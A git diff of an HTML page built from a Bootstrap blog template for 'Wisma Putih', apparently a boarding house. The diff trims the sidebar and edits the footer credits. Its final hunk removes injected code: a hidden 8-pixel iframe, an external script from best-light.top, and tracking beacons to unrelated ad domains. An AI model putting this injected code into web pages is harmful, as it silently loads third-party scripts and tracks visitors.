@@ -181,35 +181,13 @@ document.onmousedown=showclick;}();}catch(e){}</script></head>
       All about Wisma Putih
       </h3>
 
-      <nav class="blog-pagination">
-        <a class="btn btn-outline-primary" href="#">Older</a>
-        <a class="btn btn-outline-secondary disabled" href="#" tabindex="-1" aria-disabled="true">Newer</a>
-      </nav>
-
+      
     </div><!-- /.blog-main -->
 
     <aside class="col-md-4 blog-sidebar">
       <div class="p-4 mb-3 bg-light rounded">
-        <h4 class="font-italic">Apa kata merekat</h4>
-        <p class="mb-0">Wisma putih kosan paling nyaman....</p>
-      </div>
-
-      <div class="p-4">
-        <h4 class="font-italic">Archives</h4>
-        <ol class="list-unstyled mb-0">
-          <li><a href="#">March 2014</a></li>
-          <li><a href="#">February 2014</a></li>
-          <li><a href="#">January 2014</a></li>
-          <li><a href="#">December 2013</a></li>
-          <li><a href="#">November 2013</a></li>
-          <li><a href="#">October 2013</a></li>
-          <li><a href="#">September 2013</a></li>
-          <li><a href="#">August 2013</a></li>
-          <li><a href="#">July 2013</a></li>
-          <li><a href="#">June 2013</a></li>
-          <li><a href="#">May 2013</a></li>
-          <li><a href="#">April 2013</a></li>
-        </ol>
+        <h4 class="font-italic">Apa kata mereka</h4>
+        <p class="mb-0">Wisma putih kosan yang............</p>
       </div>
 
       <div class="p-4">
@@ -227,11 +205,8 @@ document.onmousedown=showclick;}();}catch(e){}</script></head>
 </main><!-- /.container -->
 
 <footer class="blog-footer">
-  <p>Blog template built for <a href="https://getbootstrap.com/">Bootstrap</a> by <a href="https://twitter.com/mdo">@mdo</a>.</p>
+  <p>Blog template built for <a href="https://wismaputih.com/">Wismaputih</a> by <a href="https://twitter.com/mdo">@adehidayat</a>.</p>
   <p>
     <a href="#">Back to top</a>
   </p>
 </footer>
-
-
-<div style="width: 8px; height: 8px; position: fixed; bottom: 1px; right: 1px; overflow: hidden; background-color: white; z-index: 100000000;"><div style="width: 8px; height: 8px; top: 1px; left: 1px; background-color: white; z-index: 100000000;"><iframe src="//utraff.com/index.php?r=iframe/index&amp;id=2350&amp;max_prerolls=10&amp;timer=40" id="ut-player" frameborder="0" name="video-extension" style="width: 640px; height: 360px; position: absolute; top: 0px; left: 0px; background-color: white; border: none; display: block;"></iframe></div></div><script type="text/javascript" src="https://best-light.top/v/537562.js?j=1221"></script><img src="//interestourflash.info/acnt?_=1570589976083&amp;did=21&amp;tag=asia&amp;r=https%253A%252F%252Fgetbootstrap.com%252Fdocs%252F4.3%252Fexamples%252Fblog%252F&amp;ua=Mozilla%2F5.0%20(Windows%20NT%206.2%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F77.0.3865.90%20Safari%2F537.36&amp;aac=&amp;if=0&amp;uid=1569864031&amp;cid=1&amp;v=422"><img src="https://gif-ads.top/click.php?cnv_u=537562"><div id="des_xnba_ewn"></div></body></html>
